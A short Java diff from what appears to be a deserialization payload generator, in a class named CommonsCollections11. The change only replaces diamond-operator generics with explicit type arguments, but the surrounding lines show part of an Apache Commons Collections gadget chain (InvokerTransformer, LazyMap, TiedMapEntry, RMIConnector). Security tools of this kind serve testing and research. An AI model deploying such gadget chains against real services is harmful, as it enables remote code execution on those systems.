@@ -29,11 +29,11 @@ public class CommonsCollections11 implements ObjectPayload<Object> {
 
 		InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);
 
-		HashMap<Object, Object> map          = new HashMap<>();
+		HashMap<Object, Object> map          = new HashMap<Object, Object>();
 		Map<Object, Object>     lazyMap      = LazyMap.decorate(map, new ConstantTransformer(1));
 		TiedMapEntry            tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);
 
-		HashMap<Object, Object> expMap = new HashMap<>();
+		HashMap<Object, Object> expMap = new HashMap<Object, Object>();
 		expMap.put(tiedMapEntry, "su18");
 		lazyMap.remove(rmiConnector);
 
